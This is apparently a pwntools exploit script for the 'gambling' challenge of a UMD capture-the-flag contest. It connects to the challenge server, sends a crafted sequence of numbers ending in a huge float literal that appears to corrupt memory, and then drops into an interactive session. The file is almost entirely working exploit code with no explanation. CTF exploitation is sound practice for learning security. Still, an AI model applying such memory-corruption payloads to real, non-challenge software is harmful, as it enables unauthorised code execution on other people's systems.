from pwn import *

context.log_level = "debug"
# context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./gambling"
libc_path = "./libc.so.6"

elf, rop = ELF(vuln_path), ROP(vuln_path)
# libc, roplibc = ELF(libc_path), ROP(libc_path)

if not f_remote:
    io = process([vuln_path])
    # io = process([ld_path, vuln_path], env={"LD_PRELOAD": libc_path})
else:
    io = remote("challs.umdctf.io", 31005)


def ddebug(b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    pause()

# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))


payload = b""
# io.sendline(payload)

a = b" 0"
#a = b" 4.89984312e-315"
payload = a+ b" 0"*5 + b" "+b"4.86784696974776020203910663922302628049521288744100461017966533174071765224162738078582829807509985921481775903627605026472682675374341691884567073557054312665199169729249901943604704936736876698730516382824350958815619734495665901783026938065284817531916942507006971393657056342704860720278802615057861467537385481835369055814430491959535638028315744737209688016310774059950236295795575518129175754341790438554781506224065801866861864027445758447737070025946871378443939353764751211019569391669626005876054864256949146887828106727254910146829292799593454040948934542908513027967472045027587961897483173731941474115429926271401290450882397287113434458660776726901531219482421875000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000e-270"
ddebug("b  *0x08049393\n" )
io.sendlineafter("numbers:", payload)
io.interactive()

